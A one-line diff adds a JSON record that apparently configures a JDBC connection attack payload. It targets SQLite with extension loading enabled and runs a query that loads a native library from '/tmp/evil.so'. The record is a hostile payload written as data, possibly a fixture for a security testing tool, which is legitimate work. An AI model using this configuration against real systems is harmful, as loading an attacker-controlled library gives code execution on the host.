@@ -1,0 +1,1 @@
+{"attack_type":"jdbc_connection","driver":"sqlite","driver_class":"org.sqlite.JDBC","jdbc_url":"jdbc:sqlite::memory:","url_params":{"enable_load_extension":"true"},"credentials":{"user":"","password":""},"pool":"","pool_config":{},"sql_payload":"SELECT load_extension('/tmp/evil.so')","deser_properties":{}}
